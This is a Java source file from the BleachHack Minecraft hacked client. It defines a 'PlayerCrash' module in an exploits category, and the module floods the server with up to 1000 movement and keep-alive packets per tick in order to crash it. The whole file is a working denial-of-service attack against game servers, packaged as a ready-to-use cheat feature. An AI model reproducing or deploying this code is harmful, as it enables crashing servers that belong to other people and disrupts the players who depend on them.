/*
 * This file is part of the BleachHack distribution (https://github.com/BleachDev/BleachHack/).
 * Copyright (c) 2021 Bleach and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package org.bleachhack.module.mods;

import org.bleachhack.event.events.EventTick;
import org.bleachhack.eventbus.BleachSubscribe;
import org.bleachhack.module.Module;
import org.bleachhack.module.ModuleCategory;
import org.bleachhack.setting.module.SettingSlider;

import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class PlayerCrash extends Module {

	public PlayerCrash() {
		super("PlayerCrash", KEY_UNBOUND, ModuleCategory.EXPLOITS, "Uses cpacketplayer packets to packetify the server so it packets your packet and packs enough to crash.",
				new SettingSlider("Uses", 1, 1000, 100, 0).withDesc("How many packets to send per tick."));
	}

	@BleachSubscribe
	public void onTick(EventTick event) {
		for (int i = 0; i < getSetting(0).asSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
			mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
		}
	}

}
